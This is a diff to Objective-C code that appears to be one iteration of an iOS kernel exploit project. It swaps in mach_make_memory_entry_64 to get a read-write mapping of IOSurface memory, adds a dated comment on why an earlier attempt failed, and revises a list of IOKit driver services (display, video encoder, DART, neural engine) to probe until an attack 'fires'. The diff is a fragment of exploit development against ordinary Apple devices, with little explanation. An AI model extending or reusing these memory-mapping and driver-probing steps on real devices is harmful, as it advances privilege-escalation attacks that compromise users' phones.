@@ -31,7 +31,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P101_BUILD @"p101-43684-reuse-v1"
+#define P101_BUILD @"p101-43684-reuse-v2"
 #define P101_TAG   @"p101"
 #define P101_LEN   0x4000ull
 
@@ -46,6 +46,12 @@ kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address,
                           vm_inherit_t inheritance);
 kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
                                  mach_vm_size_t size);
+kern_return_t mach_make_memory_entry_64(vm_map_t target_task,
+                                        memory_object_size_t *size,
+                                        memory_object_offset_t offset,
+                                        vm_prot_t permission,
+                                        mem_entry_name_port_t *object_handle,
+                                        mem_entry_name_port_t parent_handle);
 
 typedef void *(*p101_isc_t)(CFDictionaryRef);
 typedef void *(*p101_isbase_t)(void *);
@@ -125,13 +131,23 @@ static int p101_is_fp(kern_return_t kr) {
 
     mach_port_t mdport = MACH_PORT_NULL;
     mach_vm_address_t mapped = 0;
-    if (surf && pPort) {
-        mdport = pPort(surf);
-        L([NSString stringWithFormat:@"[*] CreateMachPort -> 0x%x (P069 makeMapping consumer)", (unsigned)mdport]);
-        if (mdport) {
+    /* v2 (2026-10-19): P069/P101 both fed mach_vm_map the IOSurface UC port
+       and got kr=0x1d=KERN_INVALID_OBJECT — a UC send right is NOT a memory
+       object. p019v2 and p084 proved on this device that
+       mach_make_memory_entry_64 over the surface base IS (kr=0x0, port that
+       mach_vm_map accepts). Same pattern as P084 lines ~150. */
+    if (surf && base) {
+        memory_object_size_t esz = asz ? (memory_object_size_t)asz : (memory_object_size_t)P101_LEN;
+        mem_entry_name_port_t entry = 0;
+        kern_return_t ekr = mach_make_memory_entry_64(mach_task_self(), &esz,
+            (memory_object_offset_t)(uintptr_t)base, VM_PROT_DEFAULT, &entry, 0);
+        L([NSString stringWithFormat:@"[*] memory entry kr=0x%x size=0x%llx port=0x%x",
+           (unsigned)ekr, (unsigned long long)esz, (unsigned)entry]);
+        if (ekr == KERN_SUCCESS && entry) {
+            mdport = entry;
             mach_vm_size_t msz = asz ? (mach_vm_size_t)asz : (mach_vm_size_t)P101_LEN;
             kern_return_t mkr = mach_vm_map(mach_task_self(), &mapped, msz, 0, 1,
-                                            mdport, 0, 0, VM_PROT_READ | VM_PROT_WRITE,
+                                            mdport, 0, false, VM_PROT_READ | VM_PROT_WRITE,
                                             VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
             L([NSString stringWithFormat:@"[*] mach_vm_map kr=0x%x addr=0x%llx",
                (unsigned)mkr, (unsigned long long)mapped]);
@@ -219,8 +235,8 @@ static int p101_is_fp(kern_return_t kr) {
     if (dev && pDevRelease) pDevRelease(dev);
 
     const char *svcs[] = {
-        "IOSurfaceAccelerator", "IOSurfaceRoot", "IOMobileFramebuffer",
-        "AppleAVE2", "AppleM2ScalerCSC", "AppleT8020DART", NULL
+        "IOSurfaceRoot", "IOMobileFramebuffer",
+        "AppleAVE2Driver", "AppleM2ScalerCSCDriver", "AppleT8020DART", "H11ANEIn", NULL
     };
     for (int i = 0; svcs[i] && !fired; i++) {
         io_iterator_t it = 0;
